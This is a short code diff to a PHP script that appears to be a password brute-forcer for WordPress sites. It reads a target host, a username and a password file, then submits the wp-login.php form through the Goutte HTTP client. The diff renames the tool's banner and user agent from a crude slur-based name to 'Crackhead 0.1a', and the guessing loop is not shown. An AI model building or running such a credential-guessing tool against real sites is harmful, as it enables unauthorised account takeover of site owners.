@@ -15,8 +15,8 @@
 	$passwords = $opts['P'];
 	$host      = $opts['h'];
 	
-	if( empty( $username) && empty( $passwords ) && empty( $host ) ) {
-		printf( "Crackwhore 1.0a\n\n" );
+	if( empty( $username ) && empty( $passwords ) && empty( $host ) ) {
+		printf( "Crackhead 0.1a\n\n" );
 		printf( "-h\thost (ex. www.loserville.com)\n" );
 		printf( "-u\tusername (ex. admin)\n");
 		printf( "-P\tpassword file (ex. pass.txt)\n\n");
@@ -24,7 +24,7 @@
 	}
 
 	use Goutte\Client;
-	$client = new Client( array( 'useragent' => 'Crackwhore/1.0a' ) );
+	$client = new Client( array( 'useragent' => 'Crackhead/0.1a' ) );
 
 	$crawler = $client->request( 'POST', 'http://' . $host . '/wp-login.php' );
 	$form    = $crawler->selectButton( 'Log In' )->form();
